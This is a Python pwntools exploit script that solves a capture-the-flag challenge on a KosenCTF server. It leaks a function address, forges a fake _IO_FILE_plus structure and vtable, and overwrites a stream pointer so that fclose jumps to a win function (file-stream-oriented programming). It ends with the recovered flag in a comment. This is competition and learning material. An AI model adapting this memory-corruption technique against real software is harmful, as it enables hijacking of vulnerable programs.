from pwn import *


binpath = './chall'
elf = ELF(binpath)
context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = '''
gef
# gets
b *(0x0000555555554000+0xb04)
# fclose
b *(0x0000555555554000+0xbb7)
set $buf = 0x555555756060
set $stream = 0x0000555555756260
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('pwn.kosenctf.com', 9003)


io.recvuntil(b' = ')
addr_win = int(io.recvline().rstrip(), 16)
addr_base = addr_win - 0xa5a
addr_buf = addr_base + 0x202060
addr_vtable = addr_buf + 0xe0
addr_stream = addr_base + 0x202260

print('[+] addr_buf: 0x{:x}'.format(addr_buf))

io_file_plus = b''
io_file_plus += p64(0xfbad2498)
io_file_plus += p64(0) * 8
io_file_plus += p64(0) * 5
io_file_plus += p64(0)  # fileno
io_file_plus += b'\x00' * 0x10
# io_file_plus += p64(addr_base + 0x2030f0)  # lock
io_file_plus += p64(addr_buf + 0x100)  # lock
io_file_plus += p64(0)  # offset
io_file_plus += p64(0) * 5
io_file_plus += p32(0)
io_file_plus += b'\x00' * (0xd8 - len(io_file_plus))
io_file_plus += p64(addr_vtable)  # vtable

vtable = b''
vtable += p64(0) * 17
vtable += p64(addr_win)  # _IO_close_t

payload = b''
payload += io_file_plus
payload += vtable
payload += b'\x00' * (0x200 - len(payload))
payload += p64(addr_buf)
io.sendline(payload)


io.interactive()


# KosenCTF{FS0P_1s_s1mpl3_4nd_fun!}
